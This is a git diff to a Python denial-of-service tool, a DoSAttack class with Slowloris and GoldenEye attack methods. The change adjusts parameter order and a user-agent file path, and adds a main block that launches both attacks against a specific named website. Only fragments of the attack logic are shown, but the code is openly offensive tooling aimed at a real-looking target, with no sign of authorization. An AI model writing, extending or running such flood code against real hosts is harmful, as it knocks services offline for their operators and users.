@@ -38,7 +38,7 @@ class DoSAttack:
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
 
-    def slowloris_attack(self, num_connections, url, target_port):
+    def slowloris_attack(self, url, target_port, num_connections=100):
         def read_user_agents(file_name):
             user_agents = []
             with open(file_name, "r") as file:
@@ -46,7 +46,7 @@ class DoSAttack:
                     user_agents.append(line.strip())
             return user_agents
 
-        path = os.path.join(os.path.dirname(__file__), "useragents.txt")
+        path = os.path.join(os.path.dirname(__file__), "data/user_agents.txt")
         user_agents = read_user_agents(path)
         list_of_sockets = []
 
@@ -123,7 +123,7 @@ class DoSAttack:
     def goldeneye_attack(
         self,
         url,
-        user_agents=os.path.join(os.path.dirname(__file__), "useragents.txt"),
+        user_agents=os.path.join(os.path.dirname(__file__), "data/user_agents.txt"),
         workers=10,
         sockets=500,
         method="get",
@@ -149,9 +149,7 @@ class DoSAttack:
         subprocess.run(command)
 
 
-dos = DoSAttack()  # target_url, num_connections, attack_type
-# dos.simulate_attack()
-
-# dos.slowloris_attack(num_connections=100, url="https://panthon.app", target_port=80)
-
-dos.goldeneye_attack(url="https://panthon.app")
+if __name__ == "__main__":
+    dos = DoSAttack()  # target_url, num_connections, attack_type
+    dos.slowloris_attack(url="https://panthon.app", target_port=80, num_connections=100)
+    dos.goldeneye_attack(url="https://panthon.app")
